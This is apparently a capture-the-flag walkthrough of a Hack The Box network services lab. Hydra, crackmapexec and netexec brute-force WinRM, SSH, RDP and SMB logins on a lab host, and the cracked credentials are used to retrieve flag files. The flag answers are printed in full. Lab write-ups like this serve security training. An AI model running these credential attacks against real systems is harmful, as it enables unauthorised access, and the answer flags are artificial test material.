### Network Services Exercise
 
IP: 10.129.159.196
 
---
 
I start off by downloading the files containing the suggested username and password wordlist, and then I pass those to the tools crackmapexec, netexec, and hydra.
 
---
 
### Question 1:
Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
 
First, I target the server's WinRM service.
 
```diff
+ $ netexec winrm 10.129.159.196 -u username.list -p password.list
```
 
	WINRM       10.129.159.196  5985   WINSRV           [+] WINSRV\john:november (Pwn3d!)
 
With this username and password, I then connect to WinRM using evil-winrm.
 
```diff
+ $ evil-winrm -i 10.129.159.196 -u john -p november
+ *Evil-WinRM* PS C:\Users\john> cd Desktop
+ *Evil-WinRM* PS C:\Users\john\Desktop> ls
```
 
	Mode                LastWriteTime         Length Name
	----                -------------         ------ ----
	-a----         1/5/2022   8:13 AM             18 flag.txt
 
```diff
+ *Evil-WinRM* PS C:\Users\john\Desktop> cat flag.txt
```
 
	HTB{That5Novemb3r}
 
&#x1F6A9; found **HTB{That5Novemb3r}**.
 
---
 
### Question 2:
Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
 
Next I target the SSH service with Hydra.
 
```diff
+ $ hydra -L username.list -P password.list ssh://10.129.159.196
```
 
	[22][ssh] host: 10.129.159.196   login: dennis   password: rockstar
 
With this found username and password, I use SSH to connect to the user.
 
```diff
+ $ ssh dennis@10.129.159.196
+ dennis@WINSRV C:\Users\dennis>cd Desktop
+ dennis@WINSRV C:\Users\dennis\Desktop>dir
```
 
	 Volume in drive C has no label.
	 Volume Serial Number is 2683-3D37
 
	 Directory of C:\Users\dennis\Desktop
 
	01/05/2022  09:16 AM    <DIR>          .
	01/05/2022  09:16 AM    <DIR>          ..
	01/05/2022  09:39 AM                15 flag.txt
	               1 File(s)             15 bytes
	               2 Dir(s)  26,287,222,784 bytes free
 
```diff
+ dennis@WINSRV C:\Users\dennis\Desktop>type flag.txt
```
 
	HTB{Let5R0ck1t}
 
&#x1F6A9; found **HTB{Let5R0ck1t}**.
 
---
 
### Question 3:
Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
 
Now I go for the RDP service, using crackmapexec.
 
```diff
+ $ crackmapexec rdp 10.129.159.196 -u username.list -p password.list
```
 
	RDP         10.129.159.196  3389   WINSRV           [+] WINSRV\chris:789456123 (Pwn3d!)
 
Then I use xfreerdp to RDP to the server with their username.
 
```diff
+ $ xfreerdp /u:chris /p:"789456123" /v:10.129.159.196
```
 
On the desktop is a file with the flag.
 
&#x1F6A9; found **HTB{R3m0t3DeskIsw4yT00easy}**.
 
---
 
### Question 4:
Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
 
Finally I use crackmapexec for SMB.
 
```diff
+ $ crackmapexec smb 10.129.159.196 -u username.list -p password.list
```
 
	SMB         10.129.159.196  445    WINSRV           [+] WINSRV\cassie:12345678910
 
With this username and password, I use netexec to view the available shares.
 
```diff
+ $ netexec smb 10.129.159.196 -u "cassie" -p "12345678910" --shares
```
 
	SMB         10.129.159.196  445    WINSRV           [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:None)
	SMB         10.129.159.196  445    WINSRV           [+] WINSRV\cassie:12345678910
	SMB         10.129.159.196  445    WINSRV           [*] Enumerated shares
	SMB         10.129.159.196  445    WINSRV           Share           Permissions     Remark
	SMB         10.129.159.196  445    WINSRV           -----           -----------     ------
	SMB         10.129.159.196  445    WINSRV           ADMIN$                          Remote Admin
	SMB         10.129.159.196  445    WINSRV           C$                              Default share
	SMB         10.129.159.196  445    WINSRV           CASSIE
	SMB         10.129.159.196  445    WINSRV           IPC$            READ            Remote IPC
 
Seeing the available share "CASSIE," I connect to it using smbclient.
 
```diff
+ $ smbclient -U cassie //10.129.159.196/CASSIE
+ smb: \> ls
```
 
	  .                                  DR        0  Thu Jan  6 12:48:47 2022
	  ..                                 DR        0  Thu Jan  6 12:48:47 2022
	  desktop.ini                       AHS      282  Thu Jan  6 09:44:52 2022
	  flag.txt                            A       16  Thu Jan  6 09:46:14 2022
 
			10328063 blocks of size 4096. 6418549 blocks available
 
```diff
+ smb: \> get flag.txt
+ smb: \> exit
+ $ cat flag.txt
```
 
	getting file \flag.txt of size 16 as flag.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
	HTB{S4ndM4ndB33}
 
&#x1F6A9; found **HTB{S4ndM4ndB33}**.

